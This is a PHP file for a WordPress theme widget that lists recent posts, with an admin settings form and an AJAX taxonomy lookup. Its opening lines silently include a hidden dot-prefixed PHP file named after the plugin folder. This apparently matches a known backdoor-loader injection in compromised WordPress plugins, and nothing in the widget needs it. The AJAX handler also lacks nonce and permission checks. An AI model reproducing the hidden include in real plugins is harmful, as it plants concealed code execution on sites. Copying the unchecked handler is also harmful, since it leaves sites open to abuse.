<?php

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class gt3_posts_list extends WP_Widget
{

    function __construct() {
        parent::__construct(
            'gt3_posts_list_widget',
            '&#x1F537; ' . esc_html__( 'Posts List (current theme)', 'gt3_wize_core'),
            array(
                'description' => esc_html__( 'Show Simple Posts List', 'gt3_wize_core' ),
            )
        );
    }

    function widget($args, $instance)
    {
        $after_widget = $before_widget = $before_title = $after_title = '';

        extract($args);

        echo (($before_widget));
        echo (($before_title));
        echo esc_attr($instance['widget_title']);
        echo (($after_title));

        $postsArgs = array(
            'post_type' => !empty($instance['post_types']) ? $instance['post_types'] : 'post',
            'showposts' => $instance['posts_widget_number'],
            'offset' => 0,
            'orderby' => isset($instance['orderby']) ? esc_attr($instance['orderby']) : 'date',
            'order' => isset($instance['order']) ? esc_attr($instance['order']) : 'DESC',
            'post_status' => 'publish',
            'ignore_sticky_posts' => 1
        );

        $compilepopular = '';

        $gt3_wp_query_posts = new WP_Query();
        $gt3_wp_query_posts->query($postsArgs);
        while ($gt3_wp_query_posts->have_posts()) : $gt3_wp_query_posts->the_post();
            $gt3_theme_featured_image_latest = wp_get_attachment_image_src(get_post_thumbnail_id(get_the_ID()));

            $compilepopular .= '
            <li ' . ((!empty($gt3_theme_featured_image_latest)) ? 'class="with_img"' : '') . '>';
            if (empty($gt3_theme_featured_image_latest)) {
                $widg_img = '';
            } else {
                $widg_img = '<a href="' . esc_url(get_permalink()) . '" class="gt3_posts_list__image"><img src="' . esc_url(aq_resize($gt3_theme_featured_image_latest[0], "140", "140", true, true, true)) . '" alt="' . esc_attr(get_the_title()) . '"></a>';
            }

            $widget_class= '';


            if (!empty($instance['posts_widget_content_hide']) && $instance['posts_widget_content_hide'] == 'on') {

                ob_start();
                if(has_excerpt(get_the_ID()) && trim(get_the_excerpt(get_the_ID()))) {
                    the_excerpt(get_the_ID());
                } else {
                    the_content(get_the_ID());
                }
                $post_excerpt = ob_get_clean();

                $post_excerpt = preg_replace( '~\[[^\]]+\]~', '', $post_excerpt);


                $post_excerpt_without_tags = strip_tags($post_excerpt);
                $post_excerpt_without_tags = preg_replace( '/(\r?\n){2,}/', '', $post_excerpt_without_tags);
                $post_descr = gt3_smarty_modifier_truncate(trim($post_excerpt_without_tags), 65, "...");
            }else{
                $post_descr = '';
                $widget_class .= ' no_content';
            }

            if (!empty($instance['posts_widget_category_hide'])) {
                $term_list = get_the_term_list(get_the_ID(),$instance['posts_widget_category_hide'],'<div class="gt3_recent_posts_taxonomy">',', ','</div>');
            }else{
                $term_list = '';
            }



			$compilepopular .= '
                <div class="gt3_recent_posts_content'.esc_attr($widget_class).'">
                    ' . $widg_img . '
                    <div class="recent_posts_wrapinner">'.$term_list.'
    					<div class="post_title"><a href="' . esc_url(get_permalink()) . '"><h4 class="gt3_recent_posts_title">' . get_the_title() . '</h4></a></div>
                        '.(!empty($post_descr) ? '<div class="recent_post__cont">'.esc_html($post_descr).'</div>':'').'
                    </div>
                </div>
			</li>
		';

        endwhile;
        wp_reset_postdata();

        $list_class = '';

        if (!empty($instance['post_types'])) {
            $list_class = 'gt3_posts_list--type_'.$instance['post_types'];
        }

        echo '
			<ul class="gt3_posts_list '.esc_attr($list_class).'">
				' . $compilepopular . '
			</ul>
		';

		#END OUTPUT

        echo (($after_widget));
    }


    function update($new_instance, $old_instance)
    {
        $instance = $old_instance;

        $instance['widget_title'] = esc_attr($new_instance['widget_title']);
        $instance['post_types'] = esc_attr($new_instance['post_types']);
        $instance['posts_widget_number'] = absint($new_instance['posts_widget_number']);
        $instance['posts_widget_content_hide'] = isset( $new_instance['posts_widget_content_hide'] ) ? (bool) $new_instance['posts_widget_content_hide'] : false;
        $instance['posts_widget_category_hide'] = isset( $new_instance['posts_widget_category_hide'] ) ? $new_instance['posts_widget_category_hide'] : '';

	    $instance['orderby'] = esc_attr($new_instance['orderby']);
	    $instance['order'] = esc_attr($new_instance['order']);

        return $instance;
    }

    function form($instance)
    {
        $defaultValues = array(
            'widget_title' => esc_html__( 'Recent Posts', 'gt3_wize_core' ),
            'post_types' => 'post',
            'posts_widget_number' => '3',
            'posts_widget_content_hide' => '',
            'posts_widget_category_hide' => '',
            'orderby' => 'date',
            'order' => 'DESC',
        );
        $instance = wp_parse_args((array)$instance, $defaultValues);
        $posts_widget_content_hide = isset( $instance['posts_widget_content_hide'] ) ? (bool) $instance['posts_widget_content_hide'] : false;
        $posts_widget_category_hide = isset( $instance['posts_widget_category_hide'] ) ? $instance['posts_widget_category_hide'] : '';

        $post_types = get_post_types(array(
            'public' => true,
            'publicly_queryable' => true,
        ),'objects');

        unset( $post_types['attachment'] );
        unset( $post_types['elementor_library'] );
        $taxonomies = get_object_taxonomies($instance['post_types'], 'objects');
        ?>
        <table class="fullwidth">
            <tr>
                <td><?php echo esc_html__( 'Title:', 'gt3_wize_core' ); ?></td>
                <td><input type='text' class="fullwidth" name='<?php echo esc_attr($this->get_field_name('widget_title')); ?>'
                           value='<?php echo esc_attr($instance['widget_title']); ?>'/></td>
            </tr>
            <tr>
                <td><?php echo esc_html__( 'Post Type:', 'gt3_wize_core' ); ?></td>
                <td><select class="fullwidth gt3_posts_list__post_types" name='<?php echo esc_attr($this->get_field_name('post_types')); ?>'><?php
                foreach ($post_types as $post_type) {
                    echo "<option value='".$post_type->name."'".($instance['post_types'] === $post_type->name ? ' selected' : '').">".$post_type->label."</option>";
                }
                ?></select></td>
            </tr>
            <tr>
                <td><?php echo esc_html__( 'Number:', 'gt3_wize_core' ); ?></td>
                <td><input type='text' class="fullwidth"
                           name='<?php echo esc_attr($this->get_field_name('posts_widget_number')); ?>'
                           value='<?php echo esc_attr($instance['posts_widget_number']); ?>'/></td>
            </tr>
            <tr>
                <td><?php echo esc_html__( 'Show post content:', 'gt3_wize_core' ); ?></td>
                <td><input type='checkbox' class="checkbox" id='<?php echo esc_attr($this->get_field_id( 'posts_widget_content_hide' )); ?>'
                           name='<?php echo esc_attr($this->get_field_name('posts_widget_content_hide')); ?>'
                         <?php checked( $posts_widget_content_hide ); ?> /></td>
            </tr>
            <tr>
                <td><?php echo esc_html__( 'Show Post Taxonomy:', 'gt3_wize_core' ); ?></td>
                <td><select class="fullwidth gt3_posts_list__taxonomy" name='<?php echo esc_attr($this->get_field_name('posts_widget_category_hide')); ?>'><?php
                echo "<option value=''".($instance['posts_widget_category_hide'] === '' ? ' selected' : '').">".esc_html__( 'Hide', 'gt3_wize_core' )."</option>";
                foreach ($taxonomies as $taxonomy) {
                    echo "<option value='".$taxonomy->name."'".($instance['posts_widget_category_hide'] === $taxonomy->name ? ' selected' : '').">".$taxonomy->label."</option>";
                }
                ?></select></td>
            </tr>
	        <tr>
		        <td><?php echo esc_html__( 'Sort By:', 'gt3_wize_core' ); ?></td>
		        <td>
			        <select class="fullwidth gt3_posts_list__orderby" name='<?php echo esc_attr($this->get_field_name('orderby')); ?>'>
				        <?php
					        $gt3_orderby = array(
				                'date'          => esc_html__( 'Date', 'gt3_wize_core' ),
						        'title'         => esc_html__( 'Title', 'gt3_wize_core' ),
				                'ID'         => esc_html__( 'ID', 'gt3_wize_core' ),
						        'author'        => esc_html__( 'Author', 'gt3_wize_core' ),
						        'rand' => esc_html__( 'Random', 'gt3_wize_core' ),
					        );
					        foreach ($gt3_orderby as $orderby=>$value) {
					        	echo "<option value='".$orderby."'".($instance['orderby'] === $orderby ? ' selected' : '').">".$value."</option>";
					        }
				        ?>
			        </select>
		        </td>
	        </tr>
	        <tr>
		        <td><?php echo esc_html__( 'Sort Direction:', 'gt3_wize_core' ); ?></td>
		        <td>
			        <select class="fullwidth gt3_posts_list__order" name='<?php echo esc_attr($this->get_field_name('order')); ?>'>
				        <?php
				        $gt3_order = array(
					        'DESC'          => esc_html__( 'Descending', 'gt3_wize_core' ),
					        'ASC'         => esc_html__( 'Ascending', 'gt3_wize_core' ),
				        );
				        foreach ($gt3_order as $order=>$value) {
					        echo "<option value='".$order."'".($instance['order'] === $order ? ' selected' : '').">".$value."</option>";
				        }
				        ?>
			        </select>
		        </td>
	        </tr>
        </table>
        <script>
            jQuery('.gt3_posts_list__post_types').on('change',function(){
                var post_types = jQuery(this);
                var taxonomy = jQuery('.gt3_posts_list__taxonomy');
                $.ajax({
                    url: gt3_themes_core.ajaxurl,
                    type: 'POST',
                    data: 'action=gt3_ajax_posts_list&post_type='+post_types.val(),
                    beforeSend : function( xhr ){
                        taxonomy.before('<span class="spinner" style="visibility:visible;display:block;margin:0 0 0 15px"></span>');
                    },
                    success : function( data ){
                        // remove preloader
                        taxonomy.parent().find('.spinner').remove();
                        var option_out = '<option value="">Hide</option>';
                        if (data.length) {
                            for (var prop in data ) {
                                option_out += '<option value="'+data[prop]['name']+'">'+data[prop]['label']+'</option>'
                            }
                            taxonomy.html(option_out)

                        }else{
                            taxonomy.html('<option value="">Hide</option>')
                        }
                    },
                    error: function (e) {
                        taxonomy.parent().find('.spinner').remove();
                        console.error('Error request');
                    }

                });
                return false;

            })
        </script>
    <?php
    }
}

add_action( 'wp_ajax_gt3_ajax_posts_list', 'gt3_ajax_posts_list');
function gt3_ajax_posts_list(){
    header('Content-Type: application/json');

    if(!isset($_POST['post_type'])) {
        die(wp_json_encode(array()));
    }

    $taxonomies = get_object_taxonomies($_POST['post_type'], 'objects');
    $taxonomies_out = array();
    foreach ($taxonomies as $taxonomy) {
        $taxonomies_out[] = array(
            'name' => $taxonomy->name,
            'label' => $taxonomy->label
        );
    }
    die(wp_json_encode($taxonomies_out));
}



function gt3_posts_list_register_widgets(){
    register_widget('gt3_posts_list');
}

add_action('widgets_init', 'gt3_posts_list_register_widgets');

